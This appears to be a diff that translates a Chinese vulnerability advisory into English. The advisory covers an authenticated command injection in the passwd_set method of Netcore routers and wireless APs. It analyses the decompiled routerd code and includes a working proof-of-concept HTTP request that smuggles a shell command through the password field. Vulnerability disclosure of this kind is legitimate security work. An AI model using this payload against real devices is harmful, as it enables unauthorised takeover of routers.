@@ -1,6 +1,6 @@
-# Netcore磊科路由器、无线AP产品存在授权后的任意命令注入
+# Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization
 
-## 一、涉及产品及固件下载地址
+## I. Affected Products and Firmware Download Links
 
 NBR1005GPEV2：https://www.netcoretec.com/service-support/download/firmware/2707.html
 
@@ -8,108 +8,105 @@ B6V2：https://www.netcoretec.com/service-support/download/firmware/2703.html
 
 COVER5：https://www.netcoretec.com/service-support/download/firmware/2680.html
 
-NAP930（存疑）：https://www.netcoretec.com/service-support/download/firmware/2704.html
+NAP930：https://www.netcoretec.com/service-support/download/firmware/2704.html
 
-NAP830（存疑）：https://www.netcoretec.com/service-support/download/firmware/2708.html
+NAP830：https://www.netcoretec.com/service-support/download/firmware/2708.html
 
 NBR100V2：https://www.netcoretec.com/service-support/download/firmware/2706.html
 
 NBR200V2：https://www.netcoretec.com/service-support/download/firmware/2705.html
 
-POWER13：[https://www.netcoretec.com/service-support/download/firmware/2700.html](https://www.netcoretec.com/service-support/download/firmware/2700.html)
+## II. Vulnerability Causes
 
-因硬件模拟有限（使用qemu模拟和openwrt的malta内核），无法对NAP930和NAP830进行模拟验证，但其代码中确实存在该漏洞。**如需展示模拟步骤，可告知我补充。**
+The firmware of these routers uses the `uhttpd` + `ubus` architecture.
 
-## 二、漏洞成因
+**uhttpd (Web Server)**
 
-该系列路由器固件使用 `uhttpd` + `ubus`架构
+* Listens on port `80` (HTTP) and accepts `POST /ubus` requests.
+* Parses the request header to confirm the `Content-Type` is `application/x-www-form-urlencoded`, but the actual payload is JSON (non-standard but common).
+* Forwards requests to the `ubus` RPC service (typically via `ubus` Unix Socket or CGI interface).
 
- **uhttpd（Web服务器）** ：
-
-* 监听 `80` 端口（HTTP），接收 `POST /ubus` 请求。
-* 解析请求头，确认 `Content-Type` 为 `application/x-www-form-urlencoded`，但实际负载为 JSON（不规范但常见）。
-* 将请求转发给 `ubus` RPC 服务（通常通过 `ubus` 的 Unix Socket 或 CGI 接口）。
-
-输入ubus list命令可以看到ubus注册的服务
+Running the `ubus list` command shows registered ubus services
 
 ![1746600757491](image/README/1746600757491.png)
 
-定位到routerd，即/usr/bin/routerd文件，在data段找到该服务注册的一系列方法的回调函数，passwd_set方法对应回调函数sub_416260
+The vulnerability is found in `routerd` (file: `/usr/bin/routerd`). In its data segment, the callback function for the `passwd_set` method is `sub_416260`
 
 ![1746600953768](image/README/1746600953768.png)
 
-在回调函数sub_416260中，首先调用 `blobmsg_parse` 解析 Blob 格式数据（OpenWrt 的二进制 JSON 格式）。
+In `sub_416260`, `blobmsg_parse` parses Blob format data (OpenWrt's binary JSON format, see image:
 
 ![1746601012709](image/README/1746601012709.png)
 
-还原解析式所用结构体，得到以下字段映射：
+The structure mapping is:
 
-* `v19` → `user`（用户名）
-* `v20` → `pwd`（密码） 后面还有v16=v20
-* `v21` → `by`（请求中未提供时值为空）
+* `v19` → `user` (username)
+* `v20` → `pwd` (password), with `v16 = v20`
+* `v21` → `by` (empty if not provided in the request)
 
 ![1746601107563](image/README/1746601107563.png)
 
-从 `v19`中提取用户名（`command`），跳过Blobmsg头部。
-
-遍历用户名中的每个字符，检查是否满足以下条件：
-
-* 字符是 `_`（ASCII `0x5F`） **或** 字母数字（`isalnum`函数）。
-
-若发现非法字符，记录日志并返回错误（`ulog`）。
+The username from `v19` is extracted, skipping the Blobmsg header. Each character is checked to ensure it is `_` (ASCII `0x5F`) or alphanumeric (via `isalnum`). Illegal characters trigger an error log
 
 ![1746601255662](image/README/1746601255662.png)
 
-从 `v16`中提取密码值（`v17`），跳过Blobmsg头部。此处**无任何合法性检查** ，直接传递给 `passwd_set_api`。即执行passwd_set_api(usrname,password)
+The password from `v16` (stored as `v17`, skipping the Blobmsg header) is passed to `passwd_set_api`  **without any validation** . This function executes `passwd_set_api(username, password)`.
 
-此处接下去如果result返回0，并且用户名为"root"、v15（by字段的字符串）不为"ac"，则直接将v17写入到uci set auto_ac.auto_ac.passwd=%s;uci commit auto_ac中，然后执行system，此处存在**命令注入**漏洞
+If the result is `0` (success), and the username is "root" with `v15` (value of the `by` field) not equal to "ac", the code writes `v17` to:
+
+```bash
+uci set auto_ac.auto_ac.passwd=%s; uci commit auto_ac
+```
+
+and calls `system()` with this command, creating a **command injection vulnerability**
 
 ![1746601374783](image/README/1746601374783.png)
 
-在passwd_set_api中，也并没有对密码进行检测（a2）
+In `passwd_set_api`, the password (`a2`) is not validated
 
 ![1746601489477](image/README/1746601489477.png)
 
-如果密码（a2）存在，相当于执行
+If a password exists, it constructs commands:
 
-snprintf(v10, 0x80u, "passwd %s", a1);  // v10 = "passwd root"
-snprintf(v11, 0x80u, "%s\n", a2);       // v11 = "admin123\n"
-v4 = popen(v10, "w");                   // 打开命令管道（写入模式）
+```c
+snprintf(v10, 0x80u, "passwd %s", a1);  // e.g., "passwd root"
+snprintf(v11, 0x80u, "%s\n", a2);       // e.g., "admin123\n"
+v4 = popen(v10, "w");                   // Opens a command pipe for writing
+fwrite(v11, ...);                        // Writes the password twice (for confirmation)
+```
 
-然后写入密码
-
-v5 = strlen(v11);
-fwrite(v11, v5, 1u, v4);  // 第一次写入密码
-v6 = strlen(v11);
-fwrite(v11, v6, 1, v4);   // 第二次写入密码（确认密码）
-
-成功后返回0，即成功抵达上面命令注入的漏洞处。
+On success, it returns `0`, leading to the command injection vulnerability
 
 ![1746601700013](image/README/1746601700013.png)
 
-## 三、POC解释
+## III. POC Explanation
 
+```
 POST /ubus HTTP/1.1
 Host: 192.168.50.2
 Content-Length: 163
 X-Requested-With: XMLHttpRequest
 Accept-Language: en-US,en;q=0.9
-Accept: application/json, text/javascript, */*; q=0.01
+Accept: application/json, text/javascript, /; q=0.01
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
 Origin: http://192.168.50.2
 Referer: http://192.168.50.2/guide/guide.html
 Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
+Connection: keep-alive{"jsonrpc":"2.0","id":22,"method":"call","params":["a9c61fc83080b13ded7512db83c9b123","routerd","passwd_set",{"user":"root","pwd":"admin123;mkdir -p /tmp/test1"}]}
+```
 
-{"jsonrpc":"2.0","id":22,"method":"call","params":["a9c61fc83080b13ded7512db83c9b123","routerd","passwd_set",{"user":"root","pwd":"admin123;mkdir -p /tmp/test1"}]}
+* Replace the `sid` in the `params` field (first value, e.g., `"a9c61fc83080b13ded7512db83c9b123"`) with the actual session ID obtained after login.
+* The command `mkdir -p /tmp/test1` can be replaced with any arbitrary command.
 
-将请求内容中的params字段中第一个值(sid)："a9c61fc83080b13ded7512db83c9b123"替换成登录后的拦截得到的sid，mkdir -p /tmp/test1可换成任意命令
-
-远程获得shell演示：
+Demonstration of remote shell access:
 
 ![1746603016270](image/README/1746603016270.png)
 
-## 四、建议解决办法
+## IV. Recommended Solution
 
-同样对passwd限制仅下划线和数字及字母
+Apply the same validation used for the username to the password: restrict it to contain only underscores, letters, and numbers.
+
+**Discoverer: Exploo0Osion.**
+
+**Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.**
